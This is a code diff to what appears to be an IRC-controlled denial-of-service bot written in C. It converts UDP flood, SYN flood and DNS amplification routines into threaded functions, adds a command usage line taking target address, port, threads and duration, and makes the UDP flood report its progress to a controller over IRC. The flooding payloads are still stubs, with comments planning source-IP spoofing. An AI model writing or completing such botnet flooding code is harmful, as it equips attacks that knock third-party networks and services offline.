@@ -34,6 +34,7 @@
 #elif defined(__linux__)
 
 #include <sys/socket.h>
+#include <pthread.h>
 // need other headers?
 
 #endif
@@ -46,8 +47,28 @@
  * and send out as many
  * packets as possible
  */
-void udp_flood (SOCKET s) {
+// usage: $udp -v [IPv4] -p [PORT] -h [THREADS] -t [TIME (s)]
+void *udp_flood (void *args) {
     // todo
+    char output[MAX_MSG_SIZE];
+    SOCKET s = ((thr_args *)args)->s;
+    
+    snprintf (output, sizeof (output), "PRIVMSG %s :UDP Flooding %s:%s with %d threads for %ds.\r\n", 
+                ((thr_args *)args)->contact, ((thr_args *)args)->addr, ((thr_args *)args)->port, 
+                ((thr_args *)args)->threads, ((thr_args *)args)->time);
+    send (s, output, strlen (output), 0);
+
+
+#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
+
+    // ExitThread (0);
+
+#elif defined(__linux__)
+
+    pthread_exit(0);
+
+#endif
+    return NULL;
 }
  
 /*
@@ -55,8 +76,10 @@ void udp_flood (SOCKET s) {
  * randomise source ip
  * randomise dest port?
  */
-void syn_flood (SOCKET s) {
+void *syn_flood (void *args) {
     // todo
+
+    return NULL;
 }
 
 /*
@@ -68,6 +91,8 @@ void syn_flood (SOCKET s) {
  * dns header packets located
  * in the header file
  */
-void dns_amp (SOCKET s) {
+void *dns_amp (void *args) {
     // todo
+
+    return NULL;
 }
